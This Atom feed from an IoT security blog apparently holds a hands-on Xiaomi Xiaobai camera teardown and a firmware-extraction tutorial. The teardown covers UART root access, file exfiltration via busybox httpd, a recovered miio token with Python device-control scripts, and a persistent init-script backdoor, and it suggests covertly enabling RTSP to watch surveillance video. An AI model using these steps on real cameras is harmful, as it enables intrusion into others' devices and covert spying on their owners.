<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2020-08-08T01:14:32.663Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://nocbtm.github.io/2020/08/07/%E5%B0%8F%E7%B1%B3%E5%B0%8F%E7%99%BD%E6%99%BA%E8%83%BD%E6%91%84%E5%83%8F%E5%A4%B4%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/08/07/小米小白智能摄像头分析/</id>
    <published>2020-08-07T02:37:25.088Z</published>
    <updated>2020-08-08T01:14:32.663Z</updated>
    
    <content type="html"><![CDATA[<hr><p>title: 小米小白智能摄像头分析<br>date: 2020-08-07 10:37:25<br>tags: iot</p><h2 id="categories-iot"><a href="#categories-iot" class="headerlink" title="categories: iot"></a>categories: iot</h2><h2 id="大致分析"><a href="#大致分析" class="headerlink" title="大致分析"></a>大致分析</h2><p>拿到摄像头第一步，拆机，看看有没有uart调试口，找一下flash芯片</p><p>小米做的是真的好，不太好拆，可参考硬核拆解</p><p><a href="https://www.bilibili.com/video/BV1d4411G7vu?t=64" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1d4411G7vu?t=64</a></p><p><a href="http://www.eepw.com.cn/article/201608/295287.htm" target="_blank" rel="noopener">http://www.eepw.com.cn/article/201608/295287.htm</a></p><p>拆完可以看到，这么大的NOR Flash，一般的编程器提取不了，需要更专业的设备。</p><p><img alt="image-20200807110220255" data-src="../imgs/image-20200807110220255.png" class="lozad"></p><p>uart调试口一般都在flash的附近，仔细观看。正面没有，看看反面</p><p>这里有一个坑点，有两个Rx，Tx口。经过测试如下已经焊接上的口是真正的，而另一个接上没反应。</p><p><img alt="image-20200807111406761" data-src="../imgs/image-20200807111406761.png" class="lozad"></p><p>用SecureCRT接上，波特率选择115200</p><p><img alt="image-20200807133925437" data-src="../imgs\image-20200807133925437.png" class="lozad"></p><p>连上之后，没有做用户认证，直接就进来了。看了下开启的端口，有些怪异的地方</p><p>23端口运行着 linuxrc ，这应该是防止开启telnetd服务吧</p><p>而且没有开启554端口的rtsp服务来传输视频，可能用的别的服务吧</p><p><img alt="image-20200807122344393" data-src="../imgs/image-20200807122344393.png" class="lozad"></p><p>百度了一下运行的程序</p><p>其中24883端口的<code>pulseaudio</code>是一个声音服务器，用来传输声音的</p><p>摄像头内网1883端口的<code>mosquitto</code>是一款实现了消息推送协议 MQTT v3.1 的开源消息代理软件，用来传输监控视频的</p><p>而且他传输视频不像普通摄像头那么简单，通过分析可大致猜测他是：</p><p>通过内网1883端口传输到了52230端口，然后进过miio_client处理，再通过48816端口传输到120.92.65.254:8053这个云服务器上</p><p>经过测试，针对传输视频的端口很难进行攻击，可进行攻击的只有54321这个端口，这个端口可以修改某些配置</p><p>而54321端口运行的是小米的miio协议，可参考<a href="https://github.com/OpenMiHome/mihome-binary-protocol/blob/master/doc/PROTOCOL.md" target="_blank" rel="noopener">https://github.com/OpenMiHome/mihome-binary-protocol/blob/master/doc/PROTOCOL.md</a></p><p><img alt="image-20200807140936533" data-src="../imgs/image-20200807140936533.png" class="lozad"></p><p>针对这个端口python已经有攻击的库了，可参考<a href="https://github.com/rytilahti/python-miio，" target="_blank" rel="noopener">https://github.com/rytilahti/python-miio，</a></p><p><img alt="image-20200807142959137" data-src="../imgs/image-20200807142959137.png" class="lozad"></p><p><img alt="image-20200807142031135" data-src="../imgs\image-20200807142031135.png" class="lozad"></p><p>难受的是现在还不支持小白摄像头，只能自己分析一下了</p><h2 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h2><p>可以看到我们想要分析的程序在 ./usr/bin/目录下</p><p><img alt="image-20200807144200666" data-src="E:\hexo\myhexo\source\imgs\image-20200807144200666.png" class="lozad"></p><p>busybox刚好自带httpd服务，默认是不开器的，我们把它打开，用来传输文件</p><p>把 ./usr 目录 和 ./lib 目录都压缩一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">busybox httpd</span><br><span class="line">tar -zcvf usr.tar.gz ./usr</span><br><span class="line">tar -zcvf lib.tar.gz ./lib</span><br></pre></td></tr></table></figure><p>然后wget下来，进行解压  <code>tar -zxvf usr.tar.gz</code></p><p><img alt="image-20200807145210801" data-src="../imgs/image-20200807145210801.png" class="lozad"></p><h2 id="qemu模拟"><a href="#qemu模拟" class="headerlink" title="qemu模拟"></a>qemu模拟</h2><p>找到了摄像头的初始化脚本，可以看到程序的启动方式<code>/usr/bin/mosquitto -c /etc/mosquitto/mosquitto.conf -d</code></p><p><code>/usr/bin/miio_client -D</code></p><p><img alt="" data-src="E:\hexo\myhexo\source\imgs\image-20200807145919673.png" class="lozad"></p><p>使用qemu模拟，先把mosquitt跑起来，再跑 miio_client</p><p><img alt="image-20200807150954939" data-src="../imgs\image-20200807150954939.png" class="lozad"></p><p><img alt="image-20200807151142230" data-src="../imgs/image-20200807151142230.png" class="lozad"></p><p>然后向54321发送udp数据，可以看到成功接收到</p><p><img alt="image-20200807155050870" data-src="../imgs/image-20200807155050870.png" class="lozad"></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>根据一些字符串可以快速定位到代码</p><p><img alt="image-20200807155620286" data-src="../imgs\image-20200807155620286.png" class="lozad"></p><p>可以分析出传输的数据是json格式的，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;method&quot;:&quot;get_prop&quot;,&quot;params&quot;:[&quot;night_state&quot;,&quot;night_beg_time&quot;,&quot;night_end_time&quot;]&#125;</span><br></pre></td></tr></table></figure><p>而且需要认证ID</p><p><img alt="image-20200807160052510" data-src="../imgs\image-20200807160052510.png" class="lozad"></p><p>可以看到有很多配置<code>method</code></p><p><img alt="image-20200807155838345" data-src="../imgs\image-20200807155838345.png" class="lozad"></p><p>进入miIo.config_router方法可以看到接收的数据都是用<code>json_object_object_add</code>函数来匹配接收的，</p><p>代码写的很好，没有发现什么栈溢出漏洞</p><p><img alt="image-20200807163002510" data-src="../imgs/image-20200807163002510.png" class="lozad"></p><p>但还是能分析出来一些敏感信息，wifi的连接密码</p><p><img alt="image-20200807165114652" data-src="../imgs\image-20200807165114652.png" class="lozad"></p><p>miio的配置文件</p><p><img alt="image-20200807164907414" data-src="E:\hexo\myhexo\source\imgs\image-20200807164907414.png" class="lozad"></p><p>miio的验证token</p><p><img alt="image-20200807165257875" data-src="../imgs\image-20200807165257875.png" class="lozad"></p><p>通过这个token就可以控制摄像头，先安装python-miio方便利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install python-miio</span><br></pre></td></tr></table></figure><p>目前这个库还不支持这款摄像头，需要自己再改写一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> protocol <span class="keyword">import</span> Message</span><br><span class="line"></span><br><span class="line">helobytes=bytes.fromhex(<span class="string">'21310020ffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>)</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">s.sendto(helobytes,(<span class="string">'192.168.137.159'</span>,<span class="number">54321</span>))<span class="comment">#插座ip，端口54321</span></span><br><span class="line">data,addr=s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">m=Message.parse(data)</span><br><span class="line">tok=codecs.encode(m.checksum,<span class="string">'hex'</span>)</span><br><span class="line">print(m)</span><br><span class="line">print(tok)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> miio</span><br><span class="line">ip=<span class="string">'192.168.137.159'</span></span><br><span class="line">token=<span class="string">'6ECM1qxqXi0VkF4t'</span></span><br><span class="line">s = miio.device.Device(ip=ip, token=token)</span><br><span class="line">s.info()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">from</span> miio.chuangmi_plug <span class="keyword">import</span> ChuangmiPlug</span><br><span class="line">ip=<span class="string">'192.168.137.159'</span></span><br><span class="line">token=<span class="string">'6ECM1qxqXi0VkF4t'</span></span><br><span class="line">d = ChuangmiPlug(ip=ip, token=token)</span><br><span class="line"></span><br><span class="line">x=d.status() <span class="comment"># 给出设备的状态</span></span><br><span class="line"><span class="comment"># x: &lt;ChuangmiPlugStatus power=True, usb_power=None, temperature=46, load_power=None, wifi_led=None&gt;</span></span><br><span class="line"><span class="comment"># x.power = True</span></span><br><span class="line">x=d.info()</span><br><span class="line"><span class="comment"># type(z)</span></span><br><span class="line"><span class="comment"># miio.device.DeviceInfo</span></span><br><span class="line"><span class="comment"># print(z)</span></span><br><span class="line"><span class="comment"># chuangmi.plug.m3 v1.3.8_0002 (04:CF:8C:5F:**:**) @ 192.168.1.20 - token: *****</span></span><br><span class="line">x=d.off()</span><br><span class="line"><span class="comment"># x = ['ok'] 则 控制成功</span></span><br><span class="line">x=d.on()</span><br><span class="line"><span class="comment"># x = ['ok'] 则 控制成功</span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个系统竟然可改写，我之前遇见过的摄像头都是不可改写系统。</p><p><img alt="image-20200807193009019" data-src="../imgs\image-20200807193009019.png" class="lozad"></p><p>修改一下初始化脚本，植入后门。这里要修改最初始的脚本，如果修改 <code>usr/imi/start.sh</code>重启后会复原</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/bin/run.sh</span><br></pre></td></tr></table></figure><p><img alt="image-20200807200653949" data-src="../imgs\image-20200807200653949.png" class="lozad"></p><p>重启一下，连接成功。经检测重置之后后门依然有效</p><p><img alt="image-20200807200400625" data-src="E:\hexo\myhexo\source\imgs\image-20200807200400625.png" class="lozad"></p><p>而且发现了rtsp_server，再把这个服务悄悄放到初始化脚本里，这样不就随便看监控视频了吗</p><p><img alt="image-20200807202247047" data-src="../imgs\image-20200807202247047.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;title: 小米小白智能摄像头分析&lt;br&gt;date: 2020-08-07 10:37:25&lt;br&gt;tags: iot&lt;/p&gt;
&lt;h2 id=&quot;categories-iot&quot;&gt;&lt;a href=&quot;#categories-iot&quot; class=&quot;headerlink
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AC3200(R8000)NetUSB.ko信息泄露漏洞复现</title>
    <link href="https://nocbtm.github.io/2020/07/22/AC3200-R8000-NetUSB-ko%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/07/22/AC3200-R8000-NetUSB-ko信息泄露漏洞复现/</id>
    <published>2020-07-22T02:18:39.000Z</published>
    <updated>2020-07-22T06:09:30.617Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="iot" scheme="https://nocbtm.github.io/categories/iot/"/>
    
    
      <category term="iot" scheme="https://nocbtm.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>RT809F编程器提取路由器flash固件</title>
    <link href="https://nocbtm.github.io/2020/07/06/RT809F%E7%BC%96%E7%A8%8B%E5%99%A8%E6%8F%90%E5%8F%96%E8%B7%AF%E7%94%B1%E5%99%A8flash%E5%9B%BA%E4%BB%B6/"/>
    <id>https://nocbtm.github.io/2020/07/06/RT809F编程器提取路由器flash固件/</id>
    <published>2020-07-06T09:46:47.000Z</published>
    <updated>2020-08-07T02:55:05.343Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然通过官网下载固件的方法比较便捷，但是有些厂商并不会提供固件的下载链接，这就需要我们通过其他途径来获取固件。使用从硬件设备提取固件的方法会比较通用（前提是需要有实体机设备），因为固件一般都会存储在 PCB 的某个位置里。将设备拆开之后，找到相应的 flash rom 或者 Nor flash，使用专门的工具（烧写器、编程器）进行固件的提取。</p><p>先认识一下flash文件系统和固件类型</p><h2 id="flash文件系统"><a href="#flash文件系统" class="headerlink" title="flash文件系统"></a>flash文件系统</h2><p>与普通计算机系统不同的是，嵌入式系统往往需要使用低成本的存储器，诸如EEPROM（带电可擦可编程只读存储器）或Nor/Nand Flash等。Nand flash存储器经常可以与NOR Flash存储器互换使用。大多数情况下闪存只是用来存储少量的代码，这时NOR闪存更适合一些，而NAND则是高数据存储密度的理想解决方案。</p><p>Reference:<a href="https://www.cnblogs.com/iriczhao/p/12128451.html" target="_blank" rel="noopener">Nand Flash 和Nor Flash的区别详解</a></p><p>这里列举一些最常见的Flash文件系统，具体如下：</p><h3 id="Squashfs"><a href="#Squashfs" class="headerlink" title="Squashfs"></a>Squashfs</h3><p>SquashFS 是一套基于Linux内核使用的压缩只读文件系统，文件最大支持2^64字节。他是基于GPL协议的开源软件。初始的版本使用gzip压缩，2.6.34版本Linux内核增加了支持LZMA和LZO压缩，并且在2.6.3内核版本上增加支持XZ压缩。OpenWrt以及DD-Wrt的固件使用的就是这种文件系统,多见于4～16MB的Nor型Flash中。</p><h3 id="JFFS-JFFS2"><a href="#JFFS-JFFS2" class="headerlink" title="JFFS/JFFS2"></a>JFFS/JFFS2</h3><p>全名是Journalling Flash File System，是RedHat公司开发的闪存文件系统，最早是为NOR Flash设计的，自2.6版本<br>以后开始支持NAND Flash，极适合用于嵌入式系统，多见于32MB以下的Nor型Flash固件中。它支持三种压缩算法：zlib、rubin以及rtime。</p><h3 id="YAFFS-YAFFS2"><a href="#YAFFS-YAFFS2" class="headerlink" title="YAFFS/YAFFS2"></a>YAFFS/YAFFS2</h3><p>全称为Yet Another Flash File System，是由Aleph One公司发展出来的NAND flash嵌入式文件系统。与JFFS不同的<br>是，YAFFS最初是专门针对Nand型Flash所设计的，对于大容量的Flash读写更有优势，而JFFS在小容量的FLASH中更具优势，两者各有侧重。这种文件系统多见于128MB以上的Nand型Flash固件中。</p><h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><p><img alt="image-20200724150957627" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724150957627.png" class="lozad"></p><p><img alt="image-20200724151101485" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724151101485.png" class="lozad"></p><h2 id="固件类型"><a href="#固件类型" class="headerlink" title="固件类型"></a>固件类型</h2><p>固件就是程序+文件系统的组合，由文件系统将多个程序组合成一个更大、更复杂的二进制文件。当然这里的大小指的是一个相对的概念。很多时候，固件的大小往往只有几MB，而在Windows或Linux上的可执行文件动辄就是几百MB，当然两者是不能比的，相比而言，固件是麻雀虽小，五脏俱全。</p><p>常见的固件类型，大概可分为如下几种：</p><h3 id="裸机程序"><a href="#裸机程序" class="headerlink" title="裸机程序"></a>裸机程序</h3><p>它是组成最简单的固件，也是最容易分析的固件，IDA可以正确识别并分析这种类型的固件。这类的设备可以看作是 “单片机设备”，设备固件中是比较简单的控制、循环逻辑，利用中断、例程来处理外部世界的各种事件，如常见的智能门锁内部固件</p><h3 id="实时操作系统"><a href="#实时操作系统" class="headerlink" title="实时操作系统"></a>实时操作系统</h3><p>面向控制，通信领域的实时操作系统（RTOS），如windriver公司的VxWorks、isi的psos、qnx系统软件公司的qnx、ati的nucieus等</p><p>Vxworks镜像分类</p><ul><li>可加载行VxWorks镜像：存储在开发机上，运行在板上RAM中</li><li>基于ROM的VXWorks镜像：存储在板上ROM，运行在板上RAM中</li><li>ROM驻留的VXWorks镜像：存储 在板上ROM，运行在板上ROM中</li></ul><h3 id="非实时操作系统"><a href="#非实时操作系统" class="headerlink" title="非实时操作系统"></a>非实时操作系统</h3><p>面向消费电子产品的非实时操作系统，包括个人数字助理（pad）、移动电话、机顶盒、电子书、webpone等。系统有Microsoft的WinCE，3Com的Palm，以及Symbian和Google的Andrioid等</p><h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><p>binwak 是一款优秀的固件分析、固件解包工具。可以用来解析绝大多数没有加密的固件，进行解包从而获取到固件的文件系统。</p><p>针对不同的flash文件系统也有不同的工具来解包，比如</p><p>1、Firmware Mod Kit广泛应用于Squashfs类型的固件编辑，支持多款路由器，OpenWrt和DD-Wrt的所有固件，以及TP-Link、ASUS、D-Link的大部分路由型号的固件。</p><p>2、mtd-utils 由于jffs/jffs2和yaffs/yaffs2是基于MTD的文件系统，因此可以使用Linux下的mtd-utils中的内核工具来获得对这两种文件系统的支持</p><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>binwalk通过识别文件头 智能扫描目标文件所有可识别的文件类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk DIR818LW_FW205b03.bin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file DIR818LW_FW205b03.bin </span><br><span class="line">DIR818LW_FW205b03.bin: data</span><br><span class="line">$ binwalk DIR818LW_FW205b03.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/6"</span></span><br><span class="line">120           0x78            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 5451004 bytes</span><br><span class="line">1704056       0x1A0078        PackImg section delimiter tag, little endian size: 8415232 bytes; big endian size: 6848512 bytes</span><br><span class="line">1704088       0x1A0098        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6848463 bytes, 2622 inodes, blocksize: 131072 bytes, created: 2015-07-09 07:38:10</span><br></pre></td></tr></table></figure><p>提取文件</p><p>“-e” 按照预定义的配置文件中的提取方法提取文件</p><p>“-M” 用于根据magic签名扫描结果进行递归提取</p><p>“-d” 用于限制递归提取深度，默认为8</p><p>“-A “ 使用普通可执行操作码签名扫描目标文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me  DIR818LW_FW205b03.bin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -Me DIR818LW_FW205b03.bin </span><br><span class="line"></span><br><span class="line">Scan Time:     2020-07-07 04:04:01</span><br><span class="line">Target File:   /home/iot/Desktop/tools/firmadyne/firmware/DIR818LW_FW205b03.bin</span><br><span class="line">MD5 Checksum:  be061ea71c8714b7c850e0a24291f269</span><br><span class="line">Signatures:    404</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/6"</span></span><br><span class="line">120           0x78            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 5451004 bytes</span><br><span class="line">1704056       0x1A0078        PackImg section delimiter tag, little endian size: 8415232 bytes; big endian size: 6848512 bytes</span><br><span class="line">1704088       0x1A0098        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6848463 bytes, 2622 inodes, blocksize: 131072 bytes, created: 2015-07-09 07:38:10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scan Time:     2020-07-07 04:04:08</span><br><span class="line">Target File:   /home/iot/Desktop/tools/firmadyne/firmware/_DIR818LW_FW205b03.bin-0.extracted/78</span><br><span class="line">MD5 Checksum:  55be7263933b41415e8c7c0fb46e614a</span><br><span class="line">Signatures:    404</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1090373       0x10A345        Cisco IOS microcode, <span class="keyword">for</span> <span class="string">"&amp;0"</span></span><br><span class="line">2934348       0x2CC64C        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">4116512       0x3ED020        Linux kernel version 2.6.30</span><br><span class="line">4153552       0x3F60D0        CRC32 polynomial table, little endian</span><br><span class="line">4653968       0x470390        Neighborly text, <span class="string">"NeighborSolicitstunnel6 init(): can't add protocol"</span></span><br><span class="line">4653988       0x4703A4        Neighborly text, <span class="string">"NeighborAdvertisementst add protocol"</span></span><br><span class="line">4658095       0x4713AF        Neighborly text, <span class="string">"neighbor %.2x%.2x.%.2x:%.2x:%.2x:%.2x:%.2x:%.2x lost on port %d(%s)(%s)"</span></span><br><span class="line">4673787       0x4750FB        HTML document header</span><br><span class="line">4673950       0x47519E        HTML document footer</span><br></pre></td></tr></table></figure><p>提取出的文件如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> _DIR818LW_FW205b03.bin.extracted/</span><br><span class="line">$ ls</span><br><span class="line">1A0098.squashfs  78  78.7z  squashfs-root</span><br><span class="line">$ <span class="built_in">cd</span> squashfs-root/</span><br><span class="line">$ ls</span><br><span class="line">bin  dev  etc  home  htdocs  include  lib  mnt  mydlink  proc  sbin  sys  tmp  usr  var  www</span><br></pre></td></tr></table></figure><h2 id="加密固件解包"><a href="#加密固件解包" class="headerlink" title="加密固件解包"></a>加密固件解包</h2><h3 id="vxwork"><a href="#vxwork" class="headerlink" title="vxwork"></a>vxwork</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ dd <span class="keyword">if</span>=wdr5620v3.bin of=400.lzma bs=1 skip=1024 count=861326</span><br><span class="line">861326+0 records <span class="keyword">in</span></span><br><span class="line">861326+0 records out</span><br><span class="line">861326 bytes (861 kB, 841 KiB) copied, 1.57047 s, 548 kB/s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>=文件名：输入文件名</span><br><span class="line">of=文件名：输出文件名</span><br><span class="line">skip=blocks：从输入文件开头跳过blocks个块后再开始复制</span><br><span class="line">bs=bytes：同时设置读入/输出的块大小为bytes个字节</span><br><span class="line">count= 读取的字节大小</span><br></pre></td></tr></table></figure><p>解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lzma -d 400.lzma</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -s 0xc1100 -n 512 -C bin</span><br></pre></td></tr></table></figure><p>提取符号表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"> </span><br><span class="line">symfile_path = <span class="string">'./C2E3A'</span> <span class="comment">#程序名</span></span><br><span class="line">symbols_table_start = <span class="number">8</span></span><br><span class="line">strings_table_start = <span class="number">0x9d00</span> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> open(symfile_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    symfile_contents = f.read()</span><br><span class="line"> </span><br><span class="line">symbols_table = symfile_contents[symbols_table_start:strings_table_start]</span><br><span class="line">strings_table = symfile_contents[strings_table_start:]</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_string_by_offset</span><span class="params">(offset)</span>:</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> strings_table[offset+index] != <span class="string">'x00'</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> strings_table[offset:offset+index]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_symbols_metadata</span><span class="params">()</span>:</span></span><br><span class="line">    symbols = []</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> xrange(<span class="number">0</span>, len(symbols_table),<span class="number">8</span>):</span><br><span class="line">        symbol_item = symbols_table[offset:offset+<span class="number">8</span>]</span><br><span class="line">        flag = symbol_item[<span class="number">0</span>]</span><br><span class="line">        string_offset = int(symbol_item[<span class="number">1</span>:<span class="number">4</span>].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        string_name = get_string_by_offset(string_offset)</span><br><span class="line">        target_address = int(symbol_item[<span class="number">-4</span>:].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        symbols.append((flag, string_name, target_address))</span><br><span class="line">    <span class="keyword">return</span> symbols</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_symbols</span><span class="params">(symbols_meta_data)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> flag, string_name, target_address <span class="keyword">in</span> symbols_meta_data:</span><br><span class="line">        idc.MakeName(target_address, string_name)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="string">'x54'</span>:</span><br><span class="line">            idc.MakeCode(target_address)</span><br><span class="line">            idc.MakeFunction(target_address)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    symbols_metadata = get_symbols_metadata()</span><br><span class="line">    add_symbols(symbols_metadata)</span><br></pre></td></tr></table></figure><h2 id="固件封装"><a href="#固件封装" class="headerlink" title="固件封装"></a>固件封装</h2><p>firmware-mod-kit 